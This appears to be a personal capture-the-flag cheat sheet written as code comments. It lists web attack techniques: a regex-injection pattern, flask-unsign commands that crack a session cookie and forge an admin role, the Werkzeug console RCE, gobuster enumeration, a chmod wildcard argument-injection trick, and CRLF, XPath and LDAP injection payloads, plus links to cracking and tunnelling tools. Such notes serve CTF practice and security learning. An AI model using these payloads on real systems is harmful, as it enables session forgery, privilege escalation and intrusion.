// Random stuff
//! Exploits
//* regex injection
//"/(^uoftctf\\{f.*$)|(^u(.*?)*o(.*?)*f(.*?)*t(.*?)*c(.*?)*t(.*?)*f(.*?)*\\{(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*~$)/";
// if the flag starts with uoftctf{f if would take short time otherwise a long time
//* flusk cookies unsign
// flask-unsign --decode --cookie '.eJytzkluwzAMBdC7aO0YFCVSwzm6KwpDIyKgaQJb6cbw3as0V_COBD8e_y6WupbtKnxfn2USS8vCCw1BFU3sdDTJyGw1Z-lMMVATkwpWJcwVMpNVukqE5ELKkQKgsVBU1DVR1GYoIG0hRHayJE0qJg5JUUKKw6GcjdQcsbIOoUppicAWFKPIcyvru81r_d9C6u3-swn_uYv3PK45bNd4D2teftvW-sjm0kP7HrH9mERvt7L1cHu8IEC6gLmg-ZDKg_IKZjM-aiuO6SSSzGwdO4Vnkdqjmy0zgzyLZA80j4oG-DxS0kwWmZ04vo4_DdqzNA.aIYkRw.Wg1WjUHV-zuPrrurHL83GLgbI48'
// flask-unsign --unsign --cookie '.eJytzkluwzAMBdC7aO0YFCVSwzm6KwpDIyKgaQJb6cbw3as0V_COBD8e_y6WupbtKnxfn2USS8vCCw1BFU3sdDTJyGw1Z-lMMVATkwpWJcwVMpNVukqE5ELKkQKgsVBU1DVR1GYoIG0hRHayJE0qJg5JUUKKw6GcjdQcsbIOoUppicAWFKPIcyvru81r_d9C6u3-swn_uYv3PK45bNd4D2teftvW-sjm0kP7HrH9mERvt7L1cHu8IEC6gLmg-ZDKg_IKZjM-aiuO6SSSzGwdO4Vnkdqjmy0zgzyLZA80j4oG-DxS0kwWmZ04vo4_DdqzNA.aIYkRw.Wg1WjUHV-zuPrrurHL83GLgbI48' --wordlist 'flask.txt'
// flask-unsign --sign --cookie "{'role' : 'admin'}" --secret theabyss
//* flask Console RCE
// go to /console
// https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html
//* directory enumeration
// gobuster -u https://vm1.ctfeldjazair.dz:12335/ -w /home/sleepwell/ctf/Directories_All.txt  -t 30
// gobuster -u 94.237.57.115:55013 -w /home/sleepwell/ctf/Directories_All.txt
//* YAML
// no can be interpreted as boolean value
//* chmod 000 *
// this is intepreted as chmod 000 * every file name
// so if there is a file with the name --reference=foo.txt
// and another file named foo.txt
// it will be executed as chmod 000 --reference=foo.txt foo.txt
// and that will make the chmod get the permitions from foo.txt instead of 000
//* get comands history
// ~/.bash_history
//* CRLF injection
// %0D%0A => new line
// %0D%0A%0D%0A => end of stream
//* XPath injection
//  query f"/military/district/staff[name='Groorg' and starts-with(selfDestructCode, 'H') or '1'='1']"
//* LDAP injection
// wild card *
// if () trigger and error its vulnarable
//! usefull websites
//* hash cracker
// https://crackstation.net/
//* web hook
// https://app.beeceptor.com/console/iwillneverreapeat
//* proxy without security page
// ssh -R 80:localhost:4000 localhost.run
//* DNS rebinding
// https://lock.cmpxchg8b.com/rebinder.html
//* JavaScript Deobfuscator and Unpacker
// https://de4js.kshift.me/